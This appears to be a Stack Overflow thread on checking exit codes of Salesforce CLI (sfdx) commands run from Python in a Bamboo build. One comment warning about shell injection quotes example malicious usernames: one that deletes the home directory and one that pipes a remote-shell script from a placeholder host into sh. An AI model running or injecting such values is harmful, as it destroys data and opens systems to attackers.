<div class="post-text" itemprop="text">
<p>I'm trying to develop a script that interacts with <code>salesforcedx</code> and <code>bamboo</code>. I want to write a simple python script that run each cli command and runs an exit code after each call. for example </p>
<pre><code>import os

path = "/var/Atlassian/bamboo/bamboo-home/xml-data/build-dir/SAL-SC-JOB1"
        auth = "sfdx force:auth:jwt:grant --clientid clientidexample --jwtkeyfile /root/server.key --username username@example.org --setalias Alias --setdefaultdevhubusername; echo $?" 

os.chdir(path)
os.system(auth)
</code></pre>
<p>I get a result like this</p>
<pre><code>Successfully authorized username@example.org with org ID 234582038957
0&lt;&lt; exit code 0 or could 1 or 100
</code></pre>
<p>I want to be able to run an IF statement (if possible) to stop the script if any number other than 0 exit code pops up. keep in mind my script will be making several calls using Saleforce cli commands which should hopefully all result in 0, however just in case one of the many calls fails I need some means of stopping the script. Any advice or help is greatly appreciated!</p>
</div>
<div class="post-text" itemprop="text">
<pre><code>import subprocess

path = "/var/Atlassian/bamboo/bamboo-home/xml-data/build-dir/SAL-SC-JOB1"
users = {
    'username@example.org': 'Alias',
    'other@example.org': 'Other Alias'
}

for username, alias in users.iteritems():
    auth = ['sfdx', 'force:auth:jwt:grant',
            '--clientid', 'clientidexample',
            '--jwtkeyfile', '/root/server.key',
            '--username', username,
            '--setalias', alias,
            '--setdefaultdevhubusername']
    status = subprocess.call(auth, cwd=path)
    if status != 0:
        print("Argument list %r failed with exit status %r" % (auth, status))
</code></pre>
<p>...will automatically stop on any nonzero exit code. If you didn't want to do the comparison yourself, you could use <code>subprocess.check_call()</code> and rely on a CalledProcessError being thrown.</p>
<p><sub>Community Wiki because this is duplicative of many, <em>many</em> questions on the subject already.</sub></p>
</div>
<div class="post-text" itemprop="text">
<p>This is my final code based on advice from here and some other articles.</p>
<pre><code>#!/usr/bin/python3
import subprocess
import os
import sys

path = "/var/Atlassian/bamboo/bamboo-home/xml-data/build-dir/SAL-SC-JOB1"
sfdx = 'sfdx'
auth_key= (os.environ['AUTH_KEY'])  ### environment variable

def auth():
    username="username@example.org"
    alias="somealias"
    key="server.key"
    command="force:auth:jwt:grant"
    auth= [ sfdx, command,
            '--clientid', auth_key,
            '--jwtkeyfile', key,
            '--username', username,
            '--setalias', alias,
            '--setdefaultdevhubusername']
    status = subprocess.call(auth, cwd=path)
    if status != 0:
        raise ValueError("Argument list %r failed with exit status %r" % (auth, status))
    elif status == 0:
        print("auth passed with exit code %r" % (status))
auth ()
</code></pre>
</div>
<span class="comment-copy">for future references, highlight your code and hit on your keyboard <code>ctrl</code> + <code>k</code>. It will format your code correctly</span>
<span class="comment-copy">You're probably better off using <a href="https://docs.python.org/3/library/subprocess.html#subprocess.check_call" rel="nofollow noreferrer"><code>subprocess.check_call</code></a>.</span>
<span class="comment-copy">Especially if you don't really control the usernames. You don't want someone telling your script (or whatever source it's getting your data from) that their username is <code>$(rm -rf ~)</code> or <code>$(curl http://example.com/give-me-a-remote-shell.sh | sh)</code>; using a <code>subprocess.Popen</code> derivative with <code>shell=False</code> (as by default) will avoid that kind of danger.</span>
<span class="comment-copy">If you're really not worried about that, though, leave out the <code>echo $?</code> and <code>os.system()</code> will return your exit status properly. The shell exits with the status of the last command it ran, so right now that status is that of <code>echo</code> (which is zero if it succeeds), not the exit status of <code>sfdx</code>. Your efforts at observing reality are changing it instead. :)</span>
<span class="comment-copy">thanks very much im going to try to figure out the rest of the calls on my own using your recommendation! i really appreciate the fast help.</span>
